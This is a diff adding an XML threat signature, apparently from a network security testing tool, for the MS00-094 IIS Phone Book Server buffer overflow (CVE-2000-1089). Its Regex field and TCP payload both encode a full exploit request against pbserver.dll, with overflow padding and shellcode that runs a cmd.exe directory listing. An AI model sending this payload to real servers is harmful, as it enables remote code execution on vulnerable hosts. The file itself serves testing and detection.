@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="MS00-094 IIS Phone Book Server Buffer Overrun"/>
+    <EngDesc display="true" value="This threat takes advantage of a buffer overflow in the phone book service of IIS 4.0 and 5.0.  Causes remote code to be executed listing a directory listing in winnt\system32."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Microsoft"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="IIS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="IIS_5.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.atstake.com/research/advisories/2000/a120400-1.txt"/>
+    <CVEID display="true" value="CVE-2000-1089"/>
+    <bugtraqID display="true" value="2048"/>
+    <OSVDB display="true" value="463"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000101187ab25000c000a80001003c1643a70f"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633094951506441250"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X47\X45\X54\X20\X2F\X70\X62\X73\X65\X72\X76\X65\X72\X2F\X70\X62\X73\X65\X72\X76\X65\X72\X2E\X64\X6C\X6C\X3F\X4F\X53\X41\X72\X63\X68\X3D\X30\X26\X4F\X53\X54\X79\X70\X65\X3D\X32\X26\X4C\X43\X49\X44\X3D\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X45\X26\X4F\X53\X56\X65\X72\X3D\X25\X35\X35\X25\X38\X42\X25\X45\X43\X25\X39\X30\X25\X39\X30\X25\X39\X30\X25\X39\X30\X25\X39\X30\X25\X62\X62\X25\X66\X66\X25\X66\X66\X25\X66\X66\X25\X66\X66\X25\X38\X33\X25\X65\X62\X25\X38\X62\X25\X35\X33\X25\X36\X38\X25\X36\X65\X25\X32\X65\X25\X37\X34\X25\X37\X38\X25\X36\X38\X25\X37\X36\X25\X36\X66\X25\X37\X32\X25\X37\X35\X25\X36\X38\X25\X32\X30\X25\X37\X30\X25\X37\X33\X25\X37\X32\X25\X36\X38\X25\X36\X39\X25\X37\X32\X25\X32\X30\X25\X33\X65\X25\X36\X38\X25\X32\X66\X25\X36\X33\X25\X32\X30\X25\X36\X34\X25\X39\X30\X25\X39\X30\X26\X43\X4D\X56\X65\X72\X3D\X25\X36\X38\X25\X36\X35\X25\X37\X38\X25\X36\X35\X25\X32\X30\X25\X36\X38\X25\X36\X33\X25\X36\X64\X25\X36\X34\X25\X32\X65\X25\X42\X38\X25\X38\X36\X25\X61\X39\X25\X66\X31\X25\X37\X37\X25\X38\X62\X25\X64\X63\X25\X33\X33\X25\X66\X36\X25\X35\X36\X25\X35\X33\X25\X66\X66\X25\X64\X30\X25\X39\X30\X25\X39\X30\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X44\X26\X50\X42\X56\X65\X72\X3D\X26\X30\X50\X42\X3D\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X25\X34\X63\X25\X35\X35\X25\X39\X33\X25\X35\X65\X25\X63\X63\X25\X63\X63\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X41\X25\X65\X34\X25\X35\X31\X25\X39\X33\X25\X35\X65\X6E\X6E\X6E\X6E\X20\X48\X54\X50\X2F\X31\X2E\X31\X0D\X0A\X48\X6F\X73\X74\X3A\X20\X6C\X6F\X63\X61\X6C\X68\X6F\X73\X74\X0D\X0A\X0D\X0A"/>
+    <Created value="1173913910" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026, 65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F70627365727665722F70627365727665722E646C6C3F4F53417263683D30264F53547970653D32264C4349443D4545454545454545454545454545454545454545454545454545454545454545454545454545454545454545264F535665723D25353525384225454325393025393025393025393025393025626225666625666625666625666625383325656225386225353325363825366525326525373425373825363825373625366625373225373525363825323025373025373325373225363825363925373225323025336525363825326625363325323025363425393025393026434D5665723D253638253635253738253635253230253638253633253664253634253265254238253836256139256631253737253862256463253333256636253536253533256666256430253930253930444444444444444444444444444444444444442650425665723D263050423D41414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412534632535352539332535652563632563634141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141412565342535312539332535656E6E6E6E20485454502F312E310D0A486F73743A206C6F63616C686F73740D0A0D" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502f312e3120323030204f4b0d0a5365727665723a204170616368650d0a4c6173742d4d6f6469666965643a204d6f6e2c2030322046656220323030342031313a33323a343120474d540d0a455461673a202261396436652d3830302d33643235636631383534383430220d0a4163636570742d52616e6765733a2062797465730d0a436f6e74656e742d4c656e6774683a20350d0a4b6565702d416c6976653a2074696d656f75743d31352c206d61783d3130300d0a436f6e6e656374696f6e3a204b6565702d416c6976650d0a436f6e74656e742d547970653a20746578742f706c61696e0d0a0d0a50776e5421" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
